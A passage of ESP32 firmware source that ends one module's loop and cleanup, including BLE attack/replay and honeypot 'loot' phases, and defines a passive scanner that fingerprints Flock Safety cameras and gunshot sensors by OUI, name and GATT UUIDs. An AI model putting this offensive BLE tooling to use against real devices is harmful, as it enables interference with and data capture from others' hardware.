    // Start continuous non-blocking scan
    S->pScan->start(5, bpScanComplete, false);

    // Consume lingering touch from menu
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.printf("[PREDATOR] Ready, passive scan started. Heap: %u\n", ESP.getFreeHeap());
    #endif
}

void loop() {
    if (!S || !S->initialized) return;

    // Process pending device from BLE callback
    if (S->pendingReady) {
        bpAddOrUpdate(S->pendingMAC, S->pendingAddrType, S->pendingRSSI,
                      S->pendingName, S->pendingHasName,
                      S->pendingMfgData, S->pendingMfgLen,
                      S->pendingPayload, S->pendingPayloadLen);
        S->pendingReady = false;
        S->totalFrames++;
        S->listenDirty = true;  // New data — schedule redraw
    }

    unsigned long now = millis();

    switch (S->phase) {
        case PHASE_LISTEN:
            // Touch handling
            handleListenTouch();

            // BOOT button exit
            if (IS_BOOT_PRESSED()) {
                S->exitRequested = true;
                return;
            }

            // Only redraw when dirty AND throttled (1 second min between redraws)
            if (S->listenDirty && now - S->lastDisplayUpdate > 1000) {
                drawDeviceList();
                S->lastDisplayUpdate = now;
                S->listenDirty = false;
            }
            break;

        case PHASE_TARGET:
            handleTargetTouch();

            if (IS_BOOT_PRESSED()) {
                goBackToListen();
            }
            break;

        case PHASE_ATTACK:
            handleAttackTouch();

            if (IS_BOOT_PRESSED()) {
                stopReplay();
                return;
            }

            // Dynamic attack display at ~10fps
            if (now - S->lastDisplayUpdate >= 100) {
                drawDynamicAttack();
                drawSkulls();
                drawCounterBar();
                S->lastDisplayUpdate = now;
            }
            break;

        case PHASE_RECON:
            // RECON is synchronous (runs in startRecon), but handle touch for abort
            handleReconTouch();

            if (IS_BOOT_PRESSED()) {
                goBackToListen();
            }
            break;

        case PHASE_HONEYPOT:
            handleHoneypotTouch();

            if (IS_BOOT_PRESSED()) {
                stopHoneypot();
                return;
            }

            // Dynamic honeypot display at ~4fps (250ms)
            if (now - S->lastDisplayUpdate >= 250) {
                if (!S->staticDrawn) {
                    drawHoneypotStatic();
                }
                drawHoneypotLoot();
                S->lastDisplayUpdate = now;
            }
            break;
    }

    yield();
}

bool isExitRequested() {
    return S ? S->exitRequested : false;
}

void cleanup() {
    if (S) {
        stopReplayTask();

        // Tear down honeypot GATTS if active
        if (S->hpActive) {
            S->hpActive = false;
            if (S->hpAdvStarted) {
                esp_ble_gap_stop_advertising();
                S->hpAdvStarted = false;
            }
            esp_ble_gatts_app_unregister(S->hpGattsIf);
        }

        if (S->pScan) {
            if (S->scanning) S->pScan->stop();
            S->pScan->setAdvertisedDeviceCallbacks(nullptr, false);
            S->pScan = nullptr;
        }

        S->scanning = false;
        BLEDevice::deinit(false);

        free(S);
        S = nullptr;
    }

    // Restore WiFi for other modules
    WiFi.mode(WIFI_STA);

    #if CYD_DEBUG
    Serial.println("[PREDATOR] Cleanup complete");
    #endif
}

}  // namespace BlePredator

// ═══════════════════════════════════════════════════════════════════════════
// FLOCK YOU — Flock Safety Surveillance Camera Detector
// Passively detects Flock Safety ALPR cameras, Raven gunshot detectors,
// and associated infrastructure via BLE advertisement fingerprinting.
// Sources: colonelpanichacks/flock-you, zebadrabbit/flock-you-also,
//          GainSec "Bird Hunting Season" (22 CVEs)
// Created: 2026-03-23
// ═══════════════════════════════════════════════════════════════════════════

namespace FlockYou {

// ═══════════════════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════

#define FY_MAX_DEVICES      24
#define FY_SCAN_DURATION     3     // Seconds per scan cycle
#define FY_UI_REFRESH_MS   250     // UI update throttle
#define FY_MAX_VISIBLE       7     // Visible list rows (7×28=196px, ends y=286, above buttons at y=292)
#define FY_ALERT_DURATION 2000     // Alert flash duration (ms)
#define FY_ICON_SIZE        16     // Bitmap icon dimension
#define FY_LINE_HEIGHT      28     // Pixels per list row
#define FY_LIST_START_Y     98     // Y start for device list (below stats)
#define FY_RESCAN_DELAY    100     // ms yield between scan cycles
#define FY_STALE_TIMEOUT 30000     // Remove devices not seen in 30 seconds

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE TYPES AND MATCH FLAGS
// ═══════════════════════════════════════════════════════════════════════════

enum FlockDevType : uint8_t {
    FLOCK_EXT_BATT    = 0,   // FS External Battery (= camera power pack)
    FLOCK_RAVEN       = 1,   // Raven gunshot detector (SoundThinking)
    FLOCK_PENGUIN     = 2,   // Penguin (Raven variant)
    FLOCK_WIFI_MOD    = 3,   // Flock WiFi module (WiFi OUI match)
    FLOCK_PIGVISION   = 4,   // Pigvision sub-brand
    FLOCK_MFR_MATCH   = 5,   // XUNTONG mfr ID only (unknown type)
    FLOCK_SOUNDTHINK  = 6,   // SoundThinking/ShotSpotter acoustic sensor
    FLOCK_DIRECT_REG  = 7,   // Flock Safety direct IEEE registration (B4:1E:52)
};

#define FY_MATCH_OUI   0x01
#define FY_MATCH_NAME  0x02
#define FY_MATCH_MFR   0x04
#define FY_MATCH_SVC   0x08

// Raven service bitmask
#define FY_RAVEN_DEVINFO   0x01   // 0x180A
#define FY_RAVEN_GPS       0x02   // 0x3100
#define FY_RAVEN_POWER     0x04   // 0x3200
#define FY_RAVEN_NETWORK   0x08   // 0x3300
#define FY_RAVEN_UPLOAD    0x10   // 0x3400
#define FY_RAVEN_FAILURE   0x20   // 0x3500
#define FY_RAVEN_OLD_HLTH  0x40   // 0x1809 — legacy v1.1.x Health Thermometer
#define FY_RAVEN_OLD_LOC   0x80   // 0x1819 — legacy v1.1.x Location & Navigation

// ═══════════════════════════════════════════════════════════════════════════
// PROGMEM OUI TABLES (verified from real hardware observations)
// ═══════════════════════════════════════════════════════════════════════════

// BLE OUI prefixes — FS External Battery (10 entries, from colonelpanichacks/flock-you)
static const uint8_t FY_BLE_OUI[][3] PROGMEM = {
    {0xEC, 0x1B, 0xBD},   // 32.5% of observed
    {0x58, 0x8E, 0x81},   // 23.9%
    {0x90, 0x35, 0xEA},   // 14.8%
    {0xCC, 0xCC, 0xCC},
    {0xB4, 0xE3, 0xF9},
    {0x04, 0x0D, 0x84},
    {0xF0, 0x82, 0xC0},
    {0x1C, 0x34, 0xF1},   // Added — from flock-you v2
    {0x38, 0x5B, 0x44},   // Added — from flock-you v2
    {0x94, 0x34, 0x69},   // Added — from flock-you v2
};
#define FY_BLE_OUI_COUNT 10

// WiFi OUI prefixes — Flock WiFi AP Module (10 entries, from colonelpanichacks/flock-you)
static const uint8_t FY_WIFI_OUI[][3] PROGMEM = {
    {0xD8, 0xF3, 0xBC},   // Most common
    {0x74, 0x4C, 0xA1},
    {0x14, 0x5A, 0xFC},
    {0xE4, 0xAA, 0xEA},
    {0x3C, 0x91, 0x80},
    {0x80, 0x30, 0x49},
    {0x08, 0x3A, 0x88},
    {0x70, 0xC9, 0x4E},   // Added — from flock-you v2
    {0x9C, 0x2F, 0x9D},   // Added — from flock-you v2
    {0x94, 0x08, 0x53},   // Added — from flock-you v2
};
#define FY_WIFI_OUI_COUNT 10

// Flock Safety direct IEEE registration (1 entry)
static const uint8_t FY_DIRECT_OUI[][3] PROGMEM = {
    {0xB4, 0x1E, 0x52},   // Registered to Flock Safety in IEEE OUI database
};
#define FY_DIRECT_OUI_COUNT 1

// SoundThinking/ShotSpotter OUI (1 entry — acoustic gunshot detection)
static const uint8_t FY_SOUNDTHINK_OUI[][3] PROGMEM = {
    {0xD4, 0x11, 0xD6},   // Registered to SoundThinking in IEEE OUI database
};
#define FY_SOUNDTHINK_OUI_COUNT 1

// XUNTONG manufacturer company ID (Flock's hardware vendor)
#define FY_MFR_XUNTONG 0x09C8

// Raven GATT service UUIDs — firmware v1.2.x/v1.3.x
static BLEUUID FY_UUID_DEVINFO((uint16_t)0x180A);
static BLEUUID FY_UUID_GPS((uint16_t)0x3100);
static BLEUUID FY_UUID_POWER((uint16_t)0x3200);
static BLEUUID FY_UUID_NETWORK((uint16_t)0x3300);
static BLEUUID FY_UUID_UPLOAD((uint16_t)0x3400);
static BLEUUID FY_UUID_FAILURE((uint16_t)0x3500);
// Raven GATT service UUIDs — legacy firmware v1.1.x
static BLEUUID FY_UUID_OLD_HEALTH((uint16_t)0x1809);    // Health Thermometer (battery, temp)
static BLEUUID FY_UUID_OLD_LOCATION((uint16_t)0x1819);  // Location and Navigation (GPS)

// ═══════════════════════════════════════════════════════════════════════════
// DATA STRUCTURES
// ═══════════════════════════════════════════════════════════════════════════

struct FlockDevice {
    uint8_t  mac[6];
    int8_t   rssi;             // Current RSSI
    int8_t   bestRssi;         // Strongest RSSI ever seen
    uint8_t  type;             // FlockDevType
    uint8_t  matchFlags;       // Bitmask: OUI|NAME|MFR|SVC
    char     name[20];         // BLE advertised name (truncated)
    uint32_t firstSeen;        // millis()
    uint32_t lastSeen;         // millis()
    uint8_t  ravenSvcMask;     // Bitmask of Raven GATT services seen
    uint8_t  seenCount;        // Detections (capped 255)
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES (all static — no heap allocation)
// ═══════════════════════════════════════════════════════════════════════════

static FlockDevice fyDevices[FY_MAX_DEVICES];
static volatile uint8_t fyDeviceCount = 0;
static uint8_t  fySelectedIdx = 0;
static uint8_t  fyScrollOffset = 0;
static bool     fyDetailView = false;
static bool     fyExitRequested = false;
static bool     fyInitialized = false;
static uint32_t fyScanStartTime = 0;
static uint32_t fyLastUiUpdate = 0;
static uint32_t fyTotalDetections = 0;
static uint32_t fyTotalScans = 0;
static bool     fyAlertActive = false;
static uint32_t fyAlertTime = 0;
static bool     fyScanPaused = false;
static BLEScan* pFyScan = nullptr;

// Dual-core scan task
static TaskHandle_t fyScanTaskHandle = NULL;
static volatile bool fyScanRunning = false;
static volatile bool fyScanStop = false;

// Animated dots for empty state
static uint8_t fyDotCount = 0;
static uint32_t fyDotTimer = 0;

// Type color table
static const uint16_t FY_TYPE_COLORS[] = {
    0xF800,              // FLOCK_EXT_BATT  = RED
    0xFD00,              // FLOCK_RAVEN     = ORANGE (0xFD00)
    0xFD00,              // FLOCK_PENGUIN   = ORANGE
    0xF81F,              // FLOCK_WIFI_MOD  = will use HALEHOUND_HOTPINK at runtime
    0xFFFF,              // FLOCK_PIGVISION = will use HALEHOUND_BRIGHT at runtime
    0xF81F,              // FLOCK_MFR_MATCH = will use HALEHOUND_MAGENTA at runtime
};

// ═══════════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static uint16_t fyTypeColor(uint8_t type) {
    switch (type) {
        case FLOCK_EXT_BATT:   return 0xF800;               // RED
        case FLOCK_RAVEN:      return 0xFD00;               // ORANGE
        case FLOCK_PENGUIN:    return 0xFD00;               // ORANGE
        case FLOCK_WIFI_MOD:   return HALEHOUND_HOTPINK;
        case FLOCK_PIGVISION:  return HALEHOUND_BRIGHT;
        case FLOCK_MFR_MATCH:  return HALEHOUND_MAGENTA;
        case FLOCK_SOUNDTHINK: return 0x07FF;               // CYAN — distinct from Flock
        case FLOCK_DIRECT_REG: return 0xF800;               // RED — same severity as battery
        default:               return HALEHOUND_GUNMETAL;
    }
}

static const char* fyTypeLabel(uint8_t type) {
    switch (type) {
        case FLOCK_EXT_BATT:   return "BAT";
        case FLOCK_RAVEN:      return "RAV";
        case FLOCK_PENGUIN:    return "PEN";
        case FLOCK_WIFI_MOD:   return "WFI";
        case FLOCK_PIGVISION:  return "PIG";
        case FLOCK_MFR_MATCH:  return "XUN";
        case FLOCK_SOUNDTHINK: return "SST";
        case FLOCK_DIRECT_REG: return "FLK";
        default:               return "UNK";
    }
}

static const char* fyTypeName(uint8_t type) {
    switch (type) {
        case FLOCK_EXT_BATT:   return "FS EXT BATTERY";
        case FLOCK_RAVEN:      return "RAVEN";
        case FLOCK_PENGUIN:    return "PENGUIN";
        case FLOCK_WIFI_MOD:   return "WIFI MODULE";
        case FLOCK_PIGVISION:  return "PIGVISION";
        case FLOCK_MFR_MATCH:  return "XUNTONG DEVICE";
        case FLOCK_SOUNDTHINK: return "SHOTSPOTTER";
        case FLOCK_DIRECT_REG: return "FLOCK SAFETY";
        default:               return "UNKNOWN";
    }
}

static const char* fyProximityStr(int8_t rssi) {
    if (rssi >= -40) return "CLOSE";
    if (rssi >= -60) return "NEAR";
    if (rssi >= -75) return "MED";
    if (rssi >= -90) return "FAR";
    return "WEAK";
}

static uint16_t fyProximityColor(int8_t rssi) {
    if (rssi >= -40) return 0xF800;            // RED — very close
    if (rssi >= -60) return 0xFD00;            // ORANGE — near
    if (rssi >= -75) return HALEHOUND_HOTPINK; // HOTPINK — medium
    if (rssi >= -90) return HALEHOUND_MAGENTA; // MAGENTA — far
    return HALEHOUND_GUNMETAL;                 // GUNMETAL — weak
}

static bool fyMatchOUI(const uint8_t* mac, const uint8_t ouiTable[][3], int count) {
    for (int i = 0; i < count; i++) {
        uint8_t oui[3];
        memcpy_P(oui, ouiTable[i], 3);
        if (mac[0] == oui[0] && mac[1] == oui[1] && mac[2] == oui[2]) {
            return true;
        }
    }
    return false;
}

// Case-insensitive substring search
static bool fyNameContains(const char* haystack, const char* needle) {
    if (!haystack || !needle || needle[0] == '\0') return false;
    int hLen = strlen(haystack);
    int nLen = strlen(needle);
    if (nLen > hLen) return false;
    for (int i = 0; i <= hLen - nLen; i++) {
        bool match = true;
        for (int j = 0; j < nLen; j++) {
            if (tolower((unsigned char)haystack[i + j]) != tolower((unsigned char)needle[j])) {
                match = false;
                break;
            }
        }
        if (match) return true;
    }
    return false;
}

static int fyFindDevice(const uint8_t* mac) {
    for (int i = 0; i < fyDeviceCount; i++) {
        if (memcmp(fyDevices[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

static void fyPruneStaleDevices() {
    uint32_t now = millis();
    int i = 0;
    while (i < fyDeviceCount) {
        if (now - fyDevices[i].lastSeen > FY_STALE_TIMEOUT) {
            Serial.printf("[FLOCK] EXPIRED: %02X:%02X:%02X:%02X:%02X:%02X (no seen %lus)\n",
                          fyDevices[i].mac[0], fyDevices[i].mac[1], fyDevices[i].mac[2],
                          fyDevices[i].mac[3], fyDevices[i].mac[4], fyDevices[i].mac[5],
                          (unsigned long)(now - fyDevices[i].lastSeen) / 1000);
            // Shift remaining devices down
            for (int j = i; j < fyDeviceCount - 1; j++) {
                fyDevices[j] = fyDevices[j + 1];
            }
            fyDeviceCount--;
            // Fix selection index
            if (fySelectedIdx >= fyDeviceCount && fyDeviceCount > 0) {
                fySelectedIdx = fyDeviceCount - 1;
            }
            if (fyScrollOffset > 0 && fyScrollOffset >= fyDeviceCount) {
                fyScrollOffset = (fyDeviceCount > FY_MAX_VISIBLE) ? fyDeviceCount - FY_MAX_VISIBLE : 0;
            }
            // Don't increment i — check the device that shifted into this slot
        } else {
            i++;
        }
    }
}

static void fyDrawRssiBar(int x, int y, int8_t rssi) {
    // 6 segments, each 3px wide x 8px tall
    int segments = 0;
    if (rssi >= -40)      segments = 6;
    else if (rssi >= -50) segments = 5;
    else if (rssi >= -60) segments = 4;
    else if (rssi >= -70) segments = 3;
    else if (rssi >= -80) segments = 2;
    else if (rssi >= -90) segments = 1;

    for (int s = 0; s < 6; s++) {
        uint16_t col = (s < segments) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        int barH = 3 + s;  // Bars get taller
        tft.fillRect(x + s * 4, y + (8 - barH), 3, barH, col);
    }
}

static const char* fyRavenFwEstimate(uint8_t svcMask) {
    // Correct logic from colonelpanichacks/flock-you:
    // Has 0x3100 (GPS) AND 0x3200 (Power) → v1.3.x
    // Has 0x3100 (GPS) but NOT 0x3200 (Power) → v1.2.x
    // Has 0x1819 (old Location) but NOT 0x3100 (new GPS) → v1.1.x
    // Has 0x1809 (old Health) → v1.1.x
    if ((svcMask & FY_RAVEN_GPS) && (svcMask & FY_RAVEN_POWER)) return "v1.3.x";
    if (svcMask & FY_RAVEN_GPS) return "v1.2.x";
    if (svcMask & (FY_RAVEN_OLD_LOC | FY_RAVEN_OLD_HLTH)) return "v1.1.x";
    if (svcMask & FY_RAVEN_DEVINFO) return "v1.1.x";
    return "unknown";
}

// ═══════════════════════════════════════════════════════════════════════════
// DETECTION ENGINE — called on Core 0 after each scan cycle
// ═══════════════════════════════════════════════════════════════════════════

static void fyProcessResults(BLEScanResults& results) {
    bool foundNew = false;
    int count = results.getCount();

    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        uint8_t mac[6];
        memcpy(mac, *device.getAddress().getNative(), 6);

        int8_t rssi = (int8_t)device.getRSSI();

        uint8_t matchFlags = 0;
        uint8_t devType = FLOCK_MFR_MATCH;
        uint8_t ravenMask = 0;
        char devName[20] = {0};

        // Copy device name
        if (device.haveName()) {
            const char* n = device.getName().c_str();
            strncpy(devName, n, 19);
            devName[19] = '\0';
        }

        // ── 1. OUI CHECK (4 tables: BLE battery, WiFi AP, direct reg, SoundThinking) ──
        if (fyMatchOUI(mac, FY_BLE_OUI, FY_BLE_OUI_COUNT)) {
            matchFlags |= FY_MATCH_OUI;
            devType = FLOCK_EXT_BATT;
        }
        else if (fyMatchOUI(mac, FY_WIFI_OUI, FY_WIFI_OUI_COUNT)) {
            matchFlags |= FY_MATCH_OUI;
            devType = FLOCK_WIFI_MOD;
        }
        else if (fyMatchOUI(mac, FY_DIRECT_OUI, FY_DIRECT_OUI_COUNT)) {
            matchFlags |= FY_MATCH_OUI;
            devType = FLOCK_DIRECT_REG;
        }
        else if (fyMatchOUI(mac, FY_SOUNDTHINK_OUI, FY_SOUNDTHINK_OUI_COUNT)) {
            matchFlags |= FY_MATCH_OUI;
            devType = FLOCK_SOUNDTHINK;
        }

        // ── 2. NAME CHECK (case-insensitive) ──
        if (devName[0] != '\0') {
            if (fyNameContains(devName, "FS Ext Battery")) {
                matchFlags |= FY_MATCH_NAME;
                devType = FLOCK_EXT_BATT;
            }
            else if (fyNameContains(devName, "Penguin")) {
                matchFlags |= FY_MATCH_NAME;
                devType = FLOCK_PENGUIN;
            }
            else if (fyNameContains(devName, "Pigvision")) {
                matchFlags |= FY_MATCH_NAME;
                devType = FLOCK_PIGVISION;
            }
            else if (fyNameContains(devName, "Flock")) {
                matchFlags |= FY_MATCH_NAME;
                if (devType == FLOCK_MFR_MATCH) devType = FLOCK_WIFI_MOD;
            }
        }

        // ── 3. MANUFACTURER ID CHECK ──
        if (device.haveManufacturerData()) {
            std::string mfgData = device.getManufacturerData();
            if (mfgData.length() >= 2) {
                uint16_t companyId = (uint8_t)mfgData[0] | ((uint8_t)mfgData[1] << 8);
                if (companyId == FY_MFR_XUNTONG) {
                    matchFlags |= FY_MATCH_MFR;
                }
            }
        }

        // ── 4. SERVICE UUID CHECK (Raven GATT services) ──
        if (device.haveServiceUUID()) {
            for (int s = 0; s < device.getServiceUUIDCount(); s++) {
                BLEUUID svcUUID = device.getServiceUUID(s);

                if (svcUUID.equals(FY_UUID_DEVINFO)) {
                    ravenMask |= FY_RAVEN_DEVINFO;
                }
                else if (svcUUID.equals(FY_UUID_GPS)) {
                    ravenMask |= FY_RAVEN_GPS;
                }
                else if (svcUUID.equals(FY_UUID_POWER)) {
                    ravenMask |= FY_RAVEN_POWER;
                }
                else if (svcUUID.equals(FY_UUID_NETWORK)) {
                    ravenMask |= FY_RAVEN_NETWORK;
                }
                else if (svcUUID.equals(FY_UUID_UPLOAD)) {
                    ravenMask |= FY_RAVEN_UPLOAD;
                }
                else if (svcUUID.equals(FY_UUID_FAILURE)) {
                    ravenMask |= FY_RAVEN_FAILURE;
                }
                // Legacy v1.1.x Raven service UUIDs
                else if (svcUUID.equals(FY_UUID_OLD_HEALTH)) {
                    ravenMask |= FY_RAVEN_OLD_HLTH;
                }
                else if (svcUUID.equals(FY_UUID_OLD_LOCATION)) {
                    ravenMask |= FY_RAVEN_OLD_LOC;
                }
            }

            if (ravenMask & (FY_RAVEN_GPS | FY_RAVEN_POWER | FY_RAVEN_NETWORK |
                             FY_RAVEN_UPLOAD | FY_RAVEN_FAILURE |
                             FY_RAVEN_OLD_HLTH | FY_RAVEN_OLD_LOC)) {
                matchFlags |= FY_MATCH_SVC;
                // Penguin name takes priority, otherwise Raven
                if (devType != FLOCK_PENGUIN) devType = FLOCK_RAVEN;
            }
        }

        // ── 5. SKIP if no match ──
        if (matchFlags == 0) continue;

        // ── 6. ADD OR UPDATE DEVICE ──
        int existIdx = fyFindDevice(mac);
        if (existIdx >= 0) {
            // Update existing
            FlockDevice& d = fyDevices[existIdx];
            d.rssi = rssi;
            if (rssi > d.bestRssi) d.bestRssi = rssi;
            d.lastSeen = millis();
            if (d.seenCount < 255) d.seenCount++;
            d.ravenSvcMask |= ravenMask;
            d.matchFlags |= matchFlags;
            // Upgrade type if we now have more info
            if (devType == FLOCK_RAVEN || devType == FLOCK_PENGUIN) d.type = devType;
            // Update name if we got one and didn't have one
            if (devName[0] != '\0' && d.name[0] == '\0') {
                strncpy(d.name, devName, 19);
                d.name[19] = '\0';
            }
        }
        else if (fyDeviceCount < FY_MAX_DEVICES) {
            // New device
            FlockDevice& d = fyDevices[fyDeviceCount];
            memcpy(d.mac, mac, 6);
            d.rssi = rssi;
            d.bestRssi = rssi;
            d.type = devType;
            d.matchFlags = matchFlags;
            strncpy(d.name, devName, 19);
            d.name[19] = '\0';
            d.firstSeen = millis();
            d.lastSeen = millis();
            d.ravenSvcMask = ravenMask;
            d.seenCount = 1;
            fyDeviceCount++;
            foundNew = true;

            Serial.printf("[FLOCK] NEW: %s %02X:%02X:%02X:%02X:%02X:%02X %ddBm\n",
                          fyTypeName(devType), mac[0], mac[1], mac[2],
                          mac[3], mac[4], mac[5], rssi);
        }

        fyTotalDetections++;
    }

    if (foundNew) {
        fyAlertActive = true;
        fyAlertTime = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE SCAN TASK (Core 0)
// ═══════════════════════════════════════════════════════════════════════════

static void fyScanTask(void* param) {
    fyScanRunning = true;
    while (!fyScanStop) {
        BLEScanResults results = pFyScan->start(FY_SCAN_DURATION, false);
        fyProcessResults(results);
        pFyScan->clearResults();
        fyPruneStaleDevices();
        fyTotalScans++;
        vTaskDelay(pdMS_TO_TICKS(FY_RESCAN_DELAY));
    }
    fyScanRunning = false;
    vTaskDelete(NULL);
}

static void fyStartScanTask() {
    if (fyScanTaskHandle) return;
    fyScanStop = false;
    xTaskCreatePinnedToCore(fyScanTask, "fyFlockScan", 4096, NULL, 1, &fyScanTaskHandle, 0);
    Serial.println("[FLOCK] Scan task started on Core 0");
}

static void fyStopScanTask() {
    fyScanStop = true;
    if (!fyScanTaskHandle) return;
    unsigned long t = millis();
    while (fyScanRunning && (millis() - t < 500)) delay(10);
    if (fyScanRunning) vTaskDelete(fyScanTaskHandle);
    fyScanTaskHandle = NULL;
    Serial.println("[FLOCK] Scan task stopped");
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void fyDrawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    // Back arrow (left)
    tft.drawBitmap(10, 20, bitmap_icon_go_back, FY_ICON_SIZE, FY_ICON_SIZE, HALEHOUND_MAGENTA);
    // BLE skull (center)
    tft.drawBitmap(112, 20, bitmap_icon_skull_bluetooth, FY_ICON_SIZE, FY_ICON_SIZE, HALEHOUND_HOTPINK);
    // Scanner/refresh (right)
    tft.drawBitmap(214, 20, bitmap_icon_scanner, FY_ICON_SIZE, FY_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static void fyDrawTitle() {
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
    drawGlitchTitle(SCALE_Y(14), "FLOCK YOU");
    tft.drawLine(0, 56, SCREEN_WIDTH, 56, HALEHOUND_HOTPINK);
}

static void fyDrawStatus() {
    tft.fillRect(0, 57, SCREEN_WIDTH, 14, HALEHOUND_BLACK);

    if (!fyScanPaused && fyScanRunning) {
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, 60);
        tft.print(">> SCANNING <<");

        // Pulsing LIVE dot (500ms toggle)
        bool dotOn = ((millis() / 500) % 2 == 0);
        if (dotOn) {
            tft.fillCircle(SCREEN_WIDTH - 20, 63, 3, HALEHOUND_HOTPINK);
        }
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(SCREEN_WIDTH - 42, 60);
        tft.print("LIVE");
    } else {
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(5, 60);
        tft.print(">> STOPPED <<");
    }
}

static void fyDrawStats() {
    tft.fillRect(0, 72, SCREEN_WIDTH, 18, HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);

    // Elapsed time
    String elapsed = getElapsedTimeString(fyScanStartTime);
    tft.setCursor(5, 75);
    tft.printf("T:%s", elapsed.c_str());

    // Device count
    tft.setCursor(95, 75);
    tft.printf("D:%d", fyDeviceCount);

    // GPS status (replaces scan count — way more useful)
    tft.setCursor(135, 75);
    if (gpsHasFix()) {
        GPSData gd = gpsGetData();
        tft.setTextColor(HALEHOUND_GREEN);
        tft.printf("GPS:%.4f,%.4f", gd.latitude, gd.longitude);
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("GPS:NO FIX");
    }

    tft.drawLine(0, 89, SCREEN_WIDTH, 89, HALEHOUND_GUNMETAL);
}

static void fyDrawDeviceList() {
    // Clear list area (below stats divider, above buttons)
    tft.fillRect(0, 90, SCREEN_WIDTH, SCREEN_HEIGHT - 90 - 32, HALEHOUND_BLACK);

    if (fyDeviceCount == 0) {
        // Empty state with animated dots
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_GUNMETAL);
        int cy = 140;
        tft.setCursor(15, cy);
        tft.print("Scanning for Flock cameras");
        // Animated dots
        for (int d = 0; d < fyDotCount; d++) {
            tft.print(".");
        }
        tft.setCursor(10, cy + 20);
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("Drive near surveillance to");
        tft.setCursor(10, cy + 32);
        tft.print("detect them");
        return;
    }

    int y = 92;
    int visibleCount = (fyDeviceCount - fyScrollOffset);
    if (visibleCount > FY_MAX_VISIBLE) visibleCount = FY_MAX_VISIBLE;

    for (int i = 0; i < visibleCount; i++) {
        int idx = i + fyScrollOffset;
        if (idx >= fyDeviceCount) break;
        FlockDevice& d = fyDevices[idx];

        // Selected highlight
        if (idx == fySelectedIdx) {
            tft.fillRect(0, y - 1, SCREEN_WIDTH, FY_LINE_HEIGHT, HALEHOUND_MAGENTA);
        }

        // Type color block
        uint16_t typeCol = fyTypeColor(d.type);
        tft.fillRect(2, y + 2, 3, FY_LINE_HEIGHT - 6, typeCol);

        // Type label
        uint16_t textCol = (idx == fySelectedIdx) ? HALEHOUND_BLACK : typeCol;
        tft.setTextSize(1);
        tft.setTextColor(textCol);
        tft.setCursor(8, y + 4);
        tft.print(fyTypeLabel(d.type));

        // MAC (last 4 octets)
        textCol = (idx == fySelectedIdx) ? HALEHOUND_BLACK : HALEHOUND_HOTPINK;
        tft.setTextColor(textCol);
        tft.setCursor(32, y + 4);
        char shortMac[12];
        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X:%02X",
                 d.mac[2], d.mac[3], d.mac[4], d.mac[5]);
        tft.print(shortMac);

        // RSSI
        textCol = (idx == fySelectedIdx) ? HALEHOUND_BLACK : HALEHOUND_VIOLET;
        tft.setTextColor(textCol);
        tft.setCursor(110, y + 4);
        tft.printf("%d", d.rssi);

        // Signal bar
        fyDrawRssiBar(140, y + 4, d.rssi);

        // Proximity label
        textCol = (idx == fySelectedIdx) ? HALEHOUND_BLACK : fyProximityColor(d.rssi);
        tft.setTextColor(textCol);
        tft.setCursor(168, y + 4);
        tft.print(fyProximityStr(d.rssi));

        // New device indicator
        if (d.seenCount <= 3) {
            uint16_t dotCol = (idx == fySelectedIdx) ? HALEHOUND_BLACK : HALEHOUND_HOTPINK;
            tft.fillCircle(SCREEN_WIDTH - 8, y + FY_LINE_HEIGHT / 2, 3, dotCol);
        }

        y += FY_LINE_HEIGHT;
    }

    // Scroll indicator
    if (fyDeviceCount > FY_MAX_VISIBLE) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setTextSize(1);
        tft.setCursor(SCREEN_WIDTH - 30, 92);
        tft.printf("%d/%d", fyScrollOffset + 1, fyDeviceCount);
    }
}

static void fyDrawDetail() {
    tft.fillRect(0, 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_BLACK);

    if (fySelectedIdx >= fyDeviceCount) return;
    FlockDevice& d = fyDevices[fySelectedIdx];

    int y = 42;

    // Device type in large text
    tft.setTextSize(2);
    tft.setTextColor(fyTypeColor(d.type));
    tft.setCursor(10, y);
    tft.print(fyTypeName(d.type));
    y += 24;

    tft.setTextSize(1);

    // Full MAC
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
               d.mac[0], d.mac[1], d.mac[2], d.mac[3], d.mac[4], d.mac[5]);
    y += 14;

    // Name
    if (d.name[0] != '\0') {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, y);
        tft.print("Name: ");
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.print(d.name);
        y += 14;
    }

    // RSSI
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("RSSI: ");
